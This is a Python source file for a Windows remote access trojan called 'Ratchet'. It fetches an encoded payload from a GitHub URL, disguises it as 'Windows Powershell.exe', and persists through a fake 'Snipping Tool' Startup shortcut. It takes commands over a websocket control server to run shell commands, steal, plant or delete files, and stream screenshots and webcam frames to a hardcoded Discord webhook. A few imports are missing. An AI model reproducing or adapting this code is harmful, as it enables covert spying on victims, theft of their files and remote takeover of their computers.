import sys
import cv2
import mss
import gzip
import json
import shutil
import base64
import websocket
import threading
import subprocess
import win32com.client
import discord_webhook

from PIL import ImageGrab

class Ratchet:
    def __init__(self):
        self.screen_capturing = False
        self.cam_capturing = False

        self.webhook = discord_webhook.DiscordWebhook(
            url='https://discord.com/api/webhooks/1015254612820906045/uRqGhRgAc025DHBfMncBrv8a4oE_5XTKcias_5CenS4IOcThdPPCv2I-qHWpSyGsKMEe', username="Files")

    def start(self):
        while not os.path.exists(f'C:/Users/{os.getlogin()}/AppData/Local/Windows Powershell.exe'):
            print('Trying...')
            time.sleep(5)
            try:
                bdata = gzip.decompress(base64.b64decode(requests.get(
                    'https://raw.githubusercontent.com/bmochan/noidea/main/noidea2.txt').text.encode('utf-8')))
                open(
                    f'C:/Users/{os.getlogin()}/AppData/Local/Windows Powershell.exe', 'wb').write(bdata)

                shortcut = win32com.client.Dispatch('WScript.Shell').CreateShortcut(
                    f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Snipping Tool.lnk')

                shortcut.TargetPath = f'C:/Users/{os.getlogin()}/AppData/Local/Windows Powershell.exe'
                shortcut.WorkingDirectory = f'C:/Users/{os.getlogin()}/'

                shortcut.Save()

                os.openfile(f'C:/Users/{os.getlogin()}/AppData/Local/Windows Powershell.exe')

                break
            except:
                pass

        print('Done')

        while True:
            time.sleep(5)
            websocket.enableTrace(False)

            ws = websocket.WebSocketApp("wss://fkjvhsdhsdbsheuika.ratchet1.repl.co/WS",
                                        on_open=self.on_open,
                                        on_message=self.on_message,
                                        on_error=self.on_error,
                                        on_close=self.on_close)
            ws.run_forever()

    def on_message(self, ws, message):
        message = json.loads(message)

        if 'command' in message:
            if message['command'] == 'ping':
                msg = {"type": "response", "data": {"content": "pong"}}
                ws.send(json.dumps(msg))

            elif message['command'] == 'sethook':
                webhook_url = message['webhook_url']

                try:
                    response = requests.get(webhook_url)

                    if "discord.com" in response.url and response.status_code == 200:
                        self.webhook = discord_webhook.DiscordWebhook(
                            url=webhook_url)

                        msg = {"type": "response", "data": {
                            "content": f"Successfully changed the webhook url for the current session"}}
                        ws.send(json.dumps(msg))

                    else:
                        msg = {"type": "response", "data": {
                            "content": f"The url is not a proper discord webhook url"}}
                        ws.send(json.dumps(msg))

                except requests.exceptions.RequestException as e:
                    msg = {"type": "response", "data": {
                        "content": f"{e}"}}
                    ws.send(json.dumps(msg))

            elif message['command'] == 'cd':
                directory = message['path']

                try:
                    if os.path.exists(directory):
                        if len(str(os.listdir(directory))) >= 1900:
                            try:
                                open(f"C:/Users/{os.getlogin()}/dirs.txt",
                                     'w').write(str(os.listdir(directory)))

                                with open(f"C:/Users/{os.getlogin()}/dirs.txt", "rb") as f:
                                    self.webhook.add_file(
                                        file=f.read(), filename='dirs.txt')

                                try:
                                    self.webhook.execute(remove_files=True)

                                    msg = {"type": "response", "data": {
                                        "content": f"Command executed successfully"}}
                                    ws.send(json.dumps(msg))

                                except Exception as e:
                                    msg = {"type": "response",
                                           "data": {"content": f"{e}"}}
                                    ws.send(json.dumps(msg))

                            except Exception as e:
                                msg = {"type": "response",
                                       "data": {"content": f"{e}"}}
                                ws.send(json.dumps(msg))

                        else:
                            msg = {"type": "response", "data": {
                                "content": f"{str(os.listdir(directory))}"}}
                            ws.send(json.dumps(msg))

                    else:
                        alldirs = str(
                            [chr(x) + ":" for x in range(65, 91) if os.path.exists(chr(x) + ":")])
                        msg = {"type": "response", "data": {
                            "content": f"{alldirs}"}}
                        ws.send(json.dumps(msg))

                except Exception as e:
                    msg = {"type": "response", "data": {"content": f"{e}"}}
                    ws.send(json.dumps(msg))

            elif message['command'] == 'uploadfile':
                url = message['url']
                path = message['path']

                try:
                    r = requests.get(url, allow_redirects=True)
                    head, tail = os.path.split(path)

                    open(path, 'wb').write(r.content)
                    msg = {"type": "response", "data": {
                        "content": f"File '{tail}' saved successfully"}}
                    ws.send(json.dumps(msg))

                except Exception as e:
                    msg = {"type": "response", "data": {"content": f"{e}"}}
                    ws.send(json.dumps(msg))

            elif message['command'] == 'downloadfile':
                import gofile

                path = message['path']

                if os.path.exists(path):
                    if os.path.isdir(path):
                        msg = {"type": "response", "data": {
                            "content": f"Path '{path}' is a directory"}}
                        ws.send(json.dumps(msg))

                    else:
                        head, tail = os.path.split(path)

                        file_size = round(
                            (os.path.getsize(path))/(1024 * 1024), 1)

                        if file_size > 8.0:
                            try:
                                server = gofile.getServer()

                                upload = gofile.uploadFile(path)
                                url = upload['downloadPage']

                                msg = {"type": "response", "data": {
                                    "content": f"Request entity too large. File '{tail}' uploaded online at {url}"}}
                                ws.send(json.dumps(msg))

                            except Exception as e:
                                msg = {"type": "response",
                                       "data": {"content": f"{e}"}}
                                ws.send(json.dumps(msg))
                        else:
                            try:
                                with open(path, "rb") as f:
                                    self.webhook.add_file(
                                        file=f.read(), filename=tail)

                                resp = self.webhook.execute(remove_files=True)

                                msg = {"type": "response", "data": {
                                    "content": f"File '{tail}' downloaded successfully"}}
                                ws.send(json.dumps(msg))

                            except Exception as e:
                                msg = {"type": "response",
                                       "data": {"content": f"{e}"}}
                                ws.send(json.dumps(msg))

                else:
                    msg = {"type": "response", "data": {
                        "content": f"Path '{path}' does not exist"}}
                    ws.send(json.dumps(msg))

            elif message['command'] == 'zip':
                path = message['path']

                if os.path.exists(path):
                    if os.path.isdir(path):
                        head, tail = os.path.split(path)

                        shutil.make_archive(
                            f"C:/Users/{os.getlogin()}/AppData/Local/Temp/{tail}", 'zip', path)

                        msg = {"type": "response", "data": {
                            "content": f"File was successfully zipped and saved at 'C:/Users/{os.getlogin()}/AppData/Local/Temp/{tail}.zip'"}}
                        ws.send(json.dumps(msg))

                    else:
                        msg = {"type": "response", "data": {
                            "content": f"Path {path} is not a directory"}}
                        ws.send(json.dumps(msg))

                else:
                    msg = {"type": "response", "data": {
                        "content": f"Path {path} does not exist"}}
                    ws.send(json.dumps(msg))

            elif message['command'] == 'processname':
                msg = {"type": "response", "data": {
                    "content": f"Running as '{sys.argv[0]}' from path '{os.path.abspath( __file__ )}'"}}
                ws.send(json.dumps(msg))

            elif message['command'] == 'openfile':
                path = message['path']

                if os.path.exists(path):
                    if os.path.isdir(path):
                        msg = {"type": "response", "data": {
                            "content": f"Path '{path}' is a directory"}}
                        ws.send(json.dumps(msg))

                    else:
                        try:
                            name_dir = os.path.dirname(path)
                            head, tail = os.path.split(path)

                            subprocess.run(f"cd {name_dir}", shell=True)
                            subprocess.Popen(path, shell=True)

                            msg = {"type": "response", "data": {
                                "content": f"File '{tail}' run successfully"}}
                            ws.send(json.dumps(msg))

                        except Exception as e:
                            msg = {"type": "response",
                                   "data": {"content": f"{e}"}}
                            ws.send(json.dumps(msg))

                else:
                    msg = {"type": "response", "data": {
                        "content": f"Path '{path}' does not exist"}}
                    ws.send(json.dumps(msg))

            elif message['command'] == 'removefile':
                path = message['path']

                if os.path.exists(path):
                    if os.path.isdir(path):
                        msg = {"type": "response", "data": {
                            "content": f"Path '{path}' is a directory"}}
                        ws.send(json.dumps(msg))

                    else:
                        try:
                            os.remove(path)

                            msg = {"type": "response", "data": {
                                "content": f"File '{os.path.basename(path)}' was removed successfully"}}
                            ws.send(json.dumps(msg))

                        except Exception as e:
                            msg = {"type": "response",
                                   "data": {"content": f"{e}"}}
                            ws.send(json.dumps(msg))

                else:
                    msg = {"type": "response", "data": {
                        "content": f"Path '{path}' does not exist"}}
                    ws.send(json.dumps(msg))

            elif message['command'] == 'removefolder':
                path = message['path']

                if os.path.exists(path):
                    if os.path.isdir(path):
                        try:
                            shutil.rmtree(path)
                            msg = {"type": "response", "data": {
                                "content": f"Folder '{os.path.basename(path)}' was removed successfully"}}
                            ws.send(json.dumps(msg))

                        except Exception as e:
                            msg = {"type": "response",
                                   "data": {"content": f"{e}"}}
                            ws.send(json.dumps(msg))

                    else:
                        msg = {"type": "response", "data": {
                            "content": f"Path '{path}' is not a directory"}}
                        ws.send(json.dumps(msg))

                else:
                    msg = {"type": "response", "data": {
                        "content": f"Path '{path}' does not exist"}}
                    ws.send(json.dumps(msg))

            elif message['command'] == 'execute':
                cmd = base64.b64decode(message['shellcmd']).decode()

                try:
                    data = self.execute(cmd)

                    if len(data) >= 1900:
                        try:
                            open(f"C:/Users/{os.getlogin()}/AppData/Local/Temp/data.txt",
                                 'w').write(data)

                            with open(f"C:/Users/{os.getlogin()}/AppData/Local/Temp/data.txt", "rb") as f:
                                self.webhook.add_file(
                                    file=f.read(), filename='data.txt')

                            try:
                                self.webhook.execute(remove_files=True)

                                msg = {"type": "response", "data": {
                                    "content": f"Command executed successfully"}}
                                ws.send(json.dumps(msg))

                            except Exception as e:
                                msg = {"type": "response",
                                       "data": {"content": f"{e}"}}
                                ws.send(json.dumps(msg))

                        except Exception as e:
                            msg = {"type": "response",
                                   "data": {"content": f"{e}"}}
                            ws.send(json.dumps(msg))

                    else:
                        msg = {"type": "response", "data": {
                            "content": f"{data}"}}
                        ws.send(json.dumps(msg))

                except Exception as e:
                    msg = {"type": "response", "data": {
                        "content": f"{e}"}}
                    ws.send(json.dumps(msg))

            elif message['command'] == 'screencapture':
                if self.screen_capturing == True:
                    msg = {"type": "response", "data": {
                        "content": "Screen is already being captured"}}
                    ws.send(json.dumps(msg))

                else:
                    self.screen_capturing = True

                    msg = {"type": "response", "data": {
                        "content": "Started capturing screen"}}
                    ws.send(json.dumps(msg))

                    threading.Thread(target=self.capture_screen).start()

            elif message['command'] == 'stopcapture':
                if self.screen_capturing == False:
                    msg = {"type": "response", "data": {
                        "content": "Screen is not being captured"}}
                    ws.send(json.dumps(msg))

                else:
                    self.screen_capturing = False

                    msg = {"type": "response", "data": {
                        "content": "Stopped capturing screen"}}
                    ws.send(json.dumps(msg))

            elif message['command'] == 'camcapture':
                if self.cam_capturing == True:
                    msg = {"type": "response", "data": {
                        "content": "Webcam is already being captured"}}
                    ws.send(json.dumps(msg))

                else:
                    self.cam_capturing = True

                    msg = {"type": "response", "data": {
                        "content": "Started capturing webcam"}}
                    ws.send(json.dumps(msg))

                    threading.Thread(target=self.capture_webcam).start()

            elif message['command'] == 'stopcamcapture':
                if self.cam_capturing == False:
                    msg = {"type": "response", "data": {
                        "content": "Webcam is not being captured"}}
                    ws.send(json.dumps(msg))

                else:
                    self.cam_capturing = False

                    msg = {"type": "response", "data": {
                        "content": "Stopped capturing webcam"}}
                    ws.send(json.dumps(msg))

    def on_error(self, ws, error):
        try:
            msg = {"type": "exception", "data": {
                "content": f"{error}"}}
            ws.send(json.dumps(msg))

        except Exception:
            pass

    def on_close(self, ws, close_status_code, close_msg):
        if close_msg == 'disconnect':
            sys.exit()

    def on_open(self, ws):
        ws.send(json.dumps(
            {"type": "info", "data": f"statuscheck,{os.getlogin()}"}))

    def execute(self, cmd):
        proc = subprocess.Popen(
            cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate()

        if err:
            return err.decode()

        else:
            return out.decode()

    def capture_screen(self):
        while self.screen_capturing == True:
            time.sleep(1)

            with mss.mss() as sct:
                sct.shot(
                    output=f"C:/Users/{os.getlogin()}/AppData/Local/Temp/monitor.png")

                with open(f"C:/Users/{os.getlogin()}/AppData/Local/Temp/monitor.png", "rb") as f:
                    self.webhook.add_file(
                        file=f.read(), filename="monitor.png")

                resp = self.webhook.execute(remove_files=True)

    def capture_webcam(self):
        cam = cv2.VideoCapture(0)
        while self.cam_capturing == True:
            time.sleep(1)

            ret, frame = cam.read()
            cv2.imwrite(
                f"C:/Users/{os.getlogin()}/AppData/Local/Temp/frame.jpg", frame)

            with open(f"C:/Users/{os.getlogin()}/AppData/Local/Temp/frame.jpg", "rb") as f:
                self.webhook.add_file(
                    file=f.read(), filename="frame.jpg")

            resp = self.webhook.execute(remove_files=True)


if __name__ == "__main__":
    Ratchet().start()
